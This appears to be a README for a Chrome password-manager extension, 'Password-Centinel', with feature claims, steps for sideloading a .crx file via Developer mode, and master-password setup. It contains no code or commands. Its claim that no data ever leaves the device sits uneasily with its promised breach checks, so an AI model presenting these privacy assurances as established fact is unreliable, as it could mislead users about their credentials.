## 🛠 About Password-Centinel

Password-Centinel keeps your passwords safe without sending anything to the internet. It works directly inside your browser. It helps you make strong passwords, checks if they are safe, and stores them securely. It also warns you if one of your passwords shows up in a known breach. This means you can act quickly to change it.

Key features include:

- Generates strong and unique passwords instantly.
- Checks password strength and breach history instantly.
- Stores your passwords locally on your device only.
- Works smoothly inside Chrome with no delays.
- Uses modern, privacy-first technology.

## 🚀 Installing Password-Centinel on Windows

After downloading the extension file, install it into Chrome by following these steps:

1. Open Google Chrome.

2. Type `chrome://extensions` in the address bar and press Enter.

3. Turn on **Developer mode** at the top right of the page.

4. Locate the downloaded `.crx` file on your computer (most likely in the Downloads folder).

5. Drag the `.crx` file into the Chrome Extensions page.

6. A prompt will appear asking if you want to add the extension. Click **Add extension**.

7. The Password-Centinel icon will appear near Chrome’s address bar. Click it to open.

---

## 🔒 Setting Up Your Password-Centinel Extension

Once the extension is installed:

1. Click the Password-Centinel icon in Chrome.

2. You will see options to create a new master password. This password protects all your stored passwords. Choose a strong master password that you can remember.

3. After setting up your master password, you can start generating new passwords using the extension’s password generator.

4. To check a password’s strength and breach status, paste it into the checker inside the extension.

5. Passwords you save will stay stored on your computer only. No data goes to the internet, keeping your information private.
